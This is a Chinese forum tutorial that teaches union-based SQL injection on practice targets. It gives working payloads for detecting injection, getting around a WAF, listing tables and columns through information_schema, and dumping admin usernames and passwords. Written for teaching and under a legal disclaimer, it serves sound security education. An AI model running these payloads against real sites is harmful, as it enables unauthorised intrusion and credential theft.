# Web Hacking chapter 1 （Preview）

> 本文章由网络安全研究者nanako原创，仅在[0xAA55论坛](https://www.0xAA55.com)公开发布，转载请标明原出处。本系列文章仅用于技术知识普及，请读者在学习和实践时严格按照[《中华人民共和国网络安全法》](http://gkhy.jiujiang.gov.cn/zwgk_228/jc/zcwj/202006/t20200618_4040476.html)所规定的项目合理行使权力，坚决履行义务。请勿将技术用于违法行业，请勿在未授权的情况下在靶场以外的网络环境滥用技术。

​	PS:本篇文章是我个人即时编纂的网络安全系列普及教程中的预览文章，在发布后将根据论坛里各位的反响来决定是否更新 《Web Hacking chapter 2 SQLi》及其以后章节，**如果大家对这个领域知识感兴趣的话请在本文章下评分或回复**，如果大家对网络安全前置研究的```信息收集```感兴趣的话，请在评分区回复<u>“信息”</u>，我会在日后更新《Web Hacking - Information Gathering》和有关章节。

## 第一战 SQL注入

> **名词解释：**SQL注入(SQLi)即是指web应用程序对用户输入数据的合法性<u>没有判断或过滤不严</u>，攻击者可以在web应用程序中事先定义好的查询语句的结尾上**添加额外的SQL语句**，在管理员不知情的情况下实现非法操作，以此来实现<u>欺骗数据库服务器执行非授权的任意查询</u>，从而进一步得到相应的数据信息。

本章所需知识前置：`MYSQL数据库基础`  `PHP基础` 

本章知识背景：SQL注入是1998年一名叫做rfp的黑客发表的一篇文章所进入大家视线的；OWASP TOP10霸占榜首多年，也是目前**影响力最大，覆盖面最广**的漏洞。

### 一、SQL注入的本质

注入攻击的本质是**把用户的输入当作代码执行**。

这里的两个关键条件：

1. 用户能**控制输入**
2. 原本程序要执行的代码<u>拼接</u>用户的数据后执行

### 二、SQL注入的危害

1. 获取管理员账号和密码，获取数据库信息
2. 进而入侵后台，实现上传有害信息，下载隐私信息等

### 二、实战学习：注入靶场

> 注：高密度操作流程和知识点调用。

#### 	请先进入[靶场1](http://59.63.200.79:8003)。

1. 当我们进入靶场后，点击查看新闻能够看到本页新闻信息，此时我们发现地址栏中存在`?id=1`

2. 此时我们将此参数改为`?id=2`，发现跳转到了下一个新闻页面

3. 在我们已知的PHP传参语法中可知此时以id作为变量，进行了IF等判断，并在判断后进行了从数据库取出页面的操作

4. 我们可以大胆猜测此时执行的query：

   ```mysql
   SELECT * from news where id = 1;
   ```

   -----|**接下来是验证注入**|-----

5. 为了证明一个网站是否存在SQL注入，进行一个与运算：在地址栏后加入 `and 1=2`，此时相当于进行了一个1=0的运算，可见**页面异常**，那么这个页面存在注入的几率非常高

6. 此时我们进入[靶场2](http://59.63.200.79:8014/index3.php)，输入`?id=1 and 1=1`，我们能够发现被WAF(网页防火墙)拦截了，这是目前网络上大量网站的常态，不过有WAF拦截不代表就没有SQL注入，我们试试用其他方法证明

![QQ截图20200802232100](https://raw.githubusercontent.com/bakaEC/syncFiles/master/img/QQ%E6%88%AA%E5%9B%BE20200802232100.png?token=ANLCPMCPDWXLPFAEG3REJT27E4JUK)

7. 我们删除"?"后所有内容，输入`id=2-1`，页面返回正常，证明网站能对我们的输入进行**算数处理**，那么这个页面存在注入的几率也非常高

---

好了，存在漏洞至此已经被我们推理出来了。此时我们回想一下联合查询语句及其功能：UNION SELECT (将两条查询语句的结果统一到一个表输出)，有了它我们在执行query语句

```mysql
SELECT * from A where id=1 UNION SELECT * from B;
```

时相当于同时查询了AB两个表的信息。将此思想运用到我们的注入中，便可以将获取的信息的结果与合法结果连接起来。

​	另外，我们也知道当我们输入query语句```SELECT 1,2,3,...,n from xxx```时,我们能够得到一张n列填充了1,2,3,...,n的表，如图所示

![QQ截图20200803011952](https://raw.githubusercontent.com/bakaEC/syncFiles/master/img/QQ%E6%88%AA%E5%9B%BE20200803011952.png?token=ANLCPMGBSK4EY2UK2X5M5XK7E4KWU)

我们就可以用这个特性来简单的找到页面和我们的输入交互的点（回显点）,如在[靶场1](http://59.63.200.79:8003)中，我们可以使用```?id=1 and 1=2 union select 1,2``` 得到页面回显“2”，证明表的第二列是网页的回显点。

#### 那么问题来了，在不知道表名的情况下从哪一个表获取信息呢？

​	MySQL 5.0以 上的版本，系统会生成一个自带库存放着库和表和字段的对应关系，库名为`information_schema`。在这个库里有一个名字为`tables`的表，在此存放了所有库和表名的对应关系。例：

```mysql
SELECT table_name from tables where table_schema = 'A'; //查找A库中所有的表
```

​	以上语句的结果直接列出我们指定的数据库中所有的表。

![](https://raw.githubusercontent.com/bakaEC/syncFiles/master/img/%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%B8%A6%E5%BA%93.png?token=ANLCPMBHQAFIIYUULE45R5S7E4KKA)

​	同样的，当我们不知道当前使用的表的时候，我们就可以使用database()查询，例如在[靶场1](http://59.63.200.79:8003)中，在已知第二列具有回显点后，使用```?id=1 and 1=2 union select 1,database()```便可轻易得到现在正在使用的库名"maoshe"。  

​	现在我们扩大范围。我们都知道query语句里指定某个库中的某张表使用的是"."运算符，如`a.b`就是<u>a库</u>中的<u>b表</u>，所以我们在此使用系统生成库`information_schema`下的总表`tables`进行**库中所有表的查找**。实现如下(默认已输入`?id=1 and 1=2`):

```mysql
UNION SELECT 1,table_name from information_schema.tables where table_schema=database()
```

​	回显点已经显示了库中第一张表，**正好是`admin`**，可见管理员信息就在其中。

​	不过我们不打算收手，因为很明显这个回显点只会输出一条信息，我们如果想要知道所有的表明，就要用到`limit`语句了。

```mysql
... limit n,m =>从n开始向下取m条数据
... limit 0,1 =>从0开始向下取1条数据 =>取第一条数据
... limit 1,1 =>从1开始向下取1条数据 =>取第二条数据
... limit 0,2 =>从0开始向下取2条数据
```

依次取表名后得到以下结果

| information_schema.tables |
| :-----------------------: |
|           admin           |
|           dirs            |
|           news            |
|            xss            |

    到了这一步，数据库中所有的表名我们都掌握了。我们接下来要做的就是查询指定表中的每列信息，这里使用的是`column_name`,这同样包含在`information_schema.columns`里，例如

```mysql
... UNION SELECT 1,column_name from information_schema.columns where table_name='admin' and table_schema=database()
```

此时可见页面回显点显示了第一列标签:`Id`,那么我们继续使用`limit`检索其他列

```mysql
... limit 0,1 =>Id
... limit 1,1 =>username
... limit 2,1 =>password
... limit 3,1 =>不显示，证明admin表只有3列
```

好了，到此为止我们表名，字段名全部收集完成了，可以执行以下语句

```mysql
... UNION SELECT 1,username from admin //获取用户名
... UNION SELECT 1,password from admin //获取密码
```

这个靶场就打下来了。

... ...

---

## 以上为Web Hacking chapter 1 预览版本的全部内容

本篇文章是我个人即时编纂的网络安全系列普及教程中的预览文章，在发布后将根据论坛里各位的反响来决定是否更新 《Web Hacking chapter 2 SQLi》及其以后章节，**如果大家对这个领域知识感兴趣的话请在本文章下评分或回复**，如果大家对网络安全前置研究的```信息收集```感兴趣的话，请在评分区回复<u>“信息”</u>，我会在日后更新《Web Hacking - Information Gathering》和有关章节。

---



